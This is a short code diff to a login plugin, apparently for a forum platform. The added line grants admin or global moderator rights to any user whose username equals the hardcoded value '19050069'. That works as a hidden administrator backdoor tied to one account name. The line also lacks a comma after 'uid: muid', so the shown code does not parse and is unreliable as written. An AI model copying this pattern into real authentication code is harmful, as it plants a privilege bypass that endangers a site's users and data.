@@ -40,6 +40,7 @@ plugin.continueLogin = function(req, musername, mpassword, next) {
                     if (muid != null ) {
                         next(null, {
                             uid: muid
+                            isAdminOrGlobalMod: (musername == '19050069')
                         }, '[[success:authentication-successful]]');
                     } else {
                         next(new Error('[[error:invalid-username-or-password]]'));
